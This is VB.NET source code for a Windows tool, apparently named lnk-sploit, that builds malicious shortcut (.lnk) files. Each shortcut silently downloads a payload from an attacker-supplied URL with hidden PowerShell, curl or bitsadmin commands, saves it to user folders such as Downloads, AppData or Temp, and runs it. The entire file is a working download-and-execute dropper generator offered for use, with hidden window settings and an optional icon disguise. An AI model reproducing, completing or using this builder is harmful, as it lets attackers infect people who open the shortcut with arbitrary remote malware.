﻿Imports System.IO
Imports System.Media, IWshRuntimeLibrary

Public Class frmMain

    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim player As New SoundPlayer(My.Resources.init)
        Try
            player.Play()
        Catch : End Try

        comboLocation.SelectedIndex = 0
    End Sub

    Private Sub lnkCredits_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lnkCredits.LinkClicked
        Process.Start("https://github.com/waived/lnk-sploit")
    End Sub

    Private Sub btnCompile_Click(sender As Object, e As EventArgs) Handles btnCompile.Click
        If String.IsNullOrEmpty(txtUrl.Text) Then
            MessageBox.Show("A direct URL to payload must be specified!", "Alert!")
        ElseIf String.IsNullOrEmpty(txtFilename.Text) Then
            MessageBox.Show("Filename required!", "Alert!")
        Else
            Dim _sfd As New SaveFileDialog
            _sfd.Filter = "Shortcut |*.lnk"
            _sfd.FileName = "Waived holds the game down"
            _sfd.InitialDirectory = Application.StartupPath

            If _sfd.ShowDialog() = DialogResult.OK Then
                _build(_sfd.FileName)
            End If

        End If
    End Sub

    Private Function _build(_path)
        Me.CheckForIllegalCrossThreadCalls = False


        Dim targetPath, _args, _pspath, _cmdpath As String

        ' setup payload path-environmentns
        If comboLocation.Text = "Downloads" Then
            _pspath = "$ENV:USERPROFILE\Downloads\" + txtFilename.Text
            _cmdpath = "%userprofile%\Downloads\" + txtFilename.Text
        ElseIf comboLocation.Text = "Favorites" Then
            _pspath = "$ENV:USERPROFILE\Favorites\" + txtFilename.Text
            _cmdpath = "%userprofile%\Favorites\" + txtFilename.Text
        ElseIf comboLocation.Text = "User Profile" Then
            _pspath = "$ENV:USERPROFILE\" + txtFilename.Text
            _cmdpath = "%userprofile%\" + txtFilename.Text
        ElseIf comboLocation.Text = "Application Data" Then
            _pspath = "$ENV:APPDATA\" + txtFilename.Text
            _cmdpath = "%appdata%\" + txtFilename.Text
        ElseIf comboLocation.Text = "Temporary Files" Then
            _pspath = "$ENV:TEMP\" + txtFilename.Text
            _cmdpath = "%temp%\" + txtFilename.Text
        End If

        ' determine delivery method
        If rbPs.Checked = True Then
            targetPath = "powershell.exe"

            _args = "-windowstyle hidden -command " + Chr(34) + "& { Invoke-WebRequest -Uri " + txtUrl.Text + " -OutFile " + _pspath + "; Start-Process " + _pspath + " }" + Chr(34)

        ElseIf rbCurl.Checked = True Then
            targetPath = "cmd.exe"

            _args = "Start-Process cmd.exe -ArgumentList '/c curl " + txtUrl.Text + " -o " + _cmdpath + " & start " + _cmdpath + " ' -WindowStyle Hidden"
        Else
            targetPath = "cmd.exe"

            _args = "Start-Process cmd.exe -ArgumentList '/C bitsadmin /transfer Update /download /priority normal " + txtUrl.Text + " " + _cmdpath + " & start " + _cmdpath + " ' -WindowStyle Hidden"
        End If

        ' build shortcut
        Dim shell As New WshShell()
        Dim shortcut As IWshShortcut = CType(shell.CreateShortcut(_path), IWshShortcut)

        ' set properties
        shortcut.TargetPath = targetPath
        shortcut.Arguments = _args
        shortcut.WorkingDirectory = System.IO.Path.GetDirectoryName(targetPath)
        shortcut.WindowStyle = 7 ' 7=hidden|1=norma;

        'shortcut.Description = "My Shortcut Description"
        'shortcut.IconLocation = "%ProgramFiles%\Windows NT\Accessories\wordpad.exe" ' get icon from .exe

        shortcut.Save()

    End Function

End Class
